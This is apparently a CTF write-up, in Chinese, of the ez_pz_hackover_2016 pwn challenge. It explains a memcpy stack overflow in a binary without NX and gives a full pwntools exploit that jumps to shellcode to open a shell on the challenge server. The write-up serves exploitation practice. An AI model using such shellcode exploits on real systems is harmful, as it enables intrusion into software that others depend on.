首先checksec

![image-20201112103913949](https://static.hack1s.fun/images/2021/02/06/image-20201112103913949.png)

反编译后主要执行的是一个chall的函数

![image-20201112104252777](https://static.hack1s.fun/images/2021/02/06/image-20201112104252777.png)

程序运行时首先直接给了缓冲区s的地址

![image-20201112104424768](https://static.hack1s.fun/images/2021/02/06/image-20201112104424768.png)

最下面有一个strcmp的比较，如果s内容为`crashme`就会执行vuln函数

vuln函数内部是一个memcpy，将s向栈上的一个地址写入0x400的长度

![image-20201112105129351](https://static.hack1s.fun/images/2021/02/06/image-20201112105129351.png)

因为程序没有开启nx保护，而且还给出了我们buffer的其实地址

计算出偏移后直接跳到栈上执行shellcode就可以

但是这里的问题就是要计算出s和vuln函数返回值之间的偏移

这个需要调试来看

在python脚本里面加上`gdb.attach(io)`

调试发现距离28

写出脚本

```python
from pwn import *

io = remote('node3.buuoj.cn',26469)
#io = process('./ez_pz_hackover_2016')
elf = ELF('./ez_pz_hackover_2016')

io.recvuntil('crash: ')

buffer_addr = int(io.recvline(),16)

io.recvuntil('>')

payload = 'crashme\x00'
payload = payload.ljust(26,'\x00')
payload +=  p32(buffer_addr-28) + asm(shellcraft.sh())

print(payload)

io.sendline(payload)
io.interactive()
```

